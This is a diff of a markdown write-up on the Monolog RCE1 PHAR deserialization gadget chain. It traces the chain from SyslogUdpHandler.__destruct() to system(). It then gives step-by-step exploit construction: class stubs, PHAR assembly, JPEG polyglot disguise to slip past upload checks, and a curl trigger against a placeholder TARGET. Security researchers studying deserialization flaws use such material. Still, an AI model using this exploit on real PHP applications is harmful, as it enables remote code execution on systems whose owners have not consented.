@@ -1,23 +1,20 @@
-# php-phar-gadget-chain-example
+# Monolog/RCE1 Gadget Chain — PHAR Deserialization
 
-**Author:** Julien Bongars\
-**Date:** 2026-08-19 18:40:08
-**Path:**
+| Field             | Detail                                                                                                                       |
+| ----------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| **Affects**       | `monolog/monolog` 1.4.1–1.6.0, 1.17.2–2.7.0+                                                                                 |
+| **Vector**        | `__destruct`                                                                                                                 |
+| **Type**          | RCE (Function call)                                                                                                          |
+| **PHPGGC Source** | [gadgetchains/Monolog/RCE/1/chain.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/chain.php) |
+| **PHP version**   | `phar://` auto-deserialization works on PHP 5.x–7.x only. PHP 8.0+ removed this behavior.                                    |
 
 ---
 
-Monolog RCE1 gadget chain for PHAR deserialization (`__destruct` → `system()`). `phar://` auto-deserializes metadata on PHP 5.x–7.x only; PHP 8.0+ removed that.
+## How the Chain Works
 
-**Affects:** `monolog/monolog` 1.4.1–1.6.0, 1.17.2–2.7.0+
-**Vector:** `__destruct`
-**Type:** RCE (function call)
-**PHPGGC:** [gadgetchains/Monolog/RCE/1/chain.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/chain.php)
+The chain abuses two legitimate Monolog handler classes to achieve arbitrary function execution. Neither class is dangerous on its own — the vulnerability emerges from how they interact during deserialization.
 
-## How the chain works
-
-Two Monolog handler classes: neither is dangerous alone; together they give arbitrary function execution.
-
-### `SyslogUdpHandler.__destruct()`
+### Step 1: `SyslogUdpHandler.__destruct()`
 
 When PHP garbage-collects the deserialized object, it calls `__destruct()`, inherited from `AbstractHandler`:
 
@@ -39,7 +36,7 @@ public function close() {
 
 Normally `$socket` is a `UdpSocket`, but we replace it with a `BufferHandler`.
 
-### `BufferHandler.close()` → `flush()` → `handleBatch()`
+### Step 2: `BufferHandler.close()` → `flush()` → `handleBatch()`
 
 `BufferHandler.close()` calls `flush()`, which calls `$this->handler->handleBatch()`:
 
@@ -59,7 +56,7 @@ public function flush() {
 
 We set `$handler = $this` (self-reference), so it calls its own `handleBatch()`.
 
-### `processRecord()` runs our callable processors
+### Step 3: `processRecord()` runs our callable processors
 
 `handleBatch()` iterates `$this->buffer` and calls `handle()` on each entry. `handle()` checks the log level (we bypass with `level = null`) and then runs processors:
 
@@ -83,9 +80,9 @@ We set `processors = ['current', 'system']`:
 1. `current($record)` extracts the first element from the record array (our command string)
 2. `system($command)` executes it
 
-### Full chain
+### Full Chain Summary
 
-```txt
+```
 SyslogUdpHandler.__destruct()
   → close()
     → $this->socket->close()              [socket = BufferHandler]
@@ -98,9 +95,11 @@ SyslogUdpHandler.__destruct()
                 → call_user_func('system', $command)   → RCE!
 ```
 
-## Building the exploit (no PHPGGC)
+---
 
-### Define minimal class stubs
+## Building the Exploit (No PHPGGC)
+
+### 1. Define minimal class stubs
 
 We only need to match Monolog's class names and property names. PHP deserializes based on structure, not behavior.
 
@@ -152,7 +151,7 @@ namespace Monolog\Handler
 }
 ```
 
-### Assemble the chain and build the PHAR
+### 2. Assemble the chain and build the PHAR
 
 ```php
 <?php
@@ -194,9 +193,9 @@ namespace
 }
 ```
 
-### Optional: disguise as JPEG
+### 3. Optional: Disguise as JPEG
 
-**Fake magic bytes**
+**Method 1: Fake magic bytes**
 
 ```php
 <?php
@@ -205,7 +204,7 @@ $phar_data   = file_get_contents('exploit.phar');
 file_put_contents('exploit.jpg', $jpeg_header . $phar_data);
 ```
 
-**Real JPEG polyglot** (survives `getimagesize()`, `exif_imagetype()`)
+**Method 2: Real JPEG polyglot** (survives `getimagesize()`, `exif_imagetype()`)
 
 ```php
 <?php
@@ -226,7 +225,7 @@ $phar->stopBuffering();
 rename('exploit.phar', 'exploit.jpg');
 ```
 
-### Run and trigger
+### 4. Run and trigger
 
 ```bash
 # Build the PHAR
@@ -239,14 +238,22 @@ curl "http://TARGET/vuln.php?file=phar://uploads/exploit.jpg"
 Triggerable PHP functions (any that accept stream wrappers):
 `file_exists()`, `fopen()`, `file_get_contents()`, `filesize()`, `is_dir()`, `is_file()`, `getimagesize()`, `exif_imagetype()`, `copy()`, `rename()`, `unlink()`
 
-## CVEs using this chain
+---
 
-The Monolog gadget chain itself has no CVE. CVEs are assigned to applications that pass untrusted input to file operations with `phar://`:
+## Real-World CVEs Using This Chain
 
-**CVE-2022-41343** — Dompdf ≤ 2.0.0. Trigger: `phar://` via `data://` font cache
-**WP Meta SEO** — WordPress plugin. Trigger: `file_exists()` on user-controlled path
+The Monolog gadget chain itself has no CVE. CVEs are assigned to the **applications** that pass untrusted input to file operations with `phar://`:
 
-## Resources
+| CVE            | Application      | Trigger Function                        |
+| -------------- | ---------------- | --------------------------------------- |
+| CVE-2022-41343 | Dompdf ≤ 2.0.0   | `phar://` via `data://` font cache      |
+| WP Meta SEO    | WordPress plugin | `file_exists()` on user-controlled path |
 
-- [PHPGGC](https://github.com/ambionics/phpggc) — gadget chains including Monolog/RCE1
-- [Monolog](https://github.com/Seldaek/monolog) — handler classes used in the chain
+---
+
+## References
+
+- **PHPGGC** — https://github.com/ambionics/phpggc
+- **BlackHat US 2018** — Sam Thomas, _"It's a PHP Unserialization Vulnerability Jim, But Not as We Know It"_
+- **PHP 8.0 migration** — `phar://` no longer auto-deserializes metadata on stream operations
+- **Monolog source** — https://github.com/Seldaek/monolog
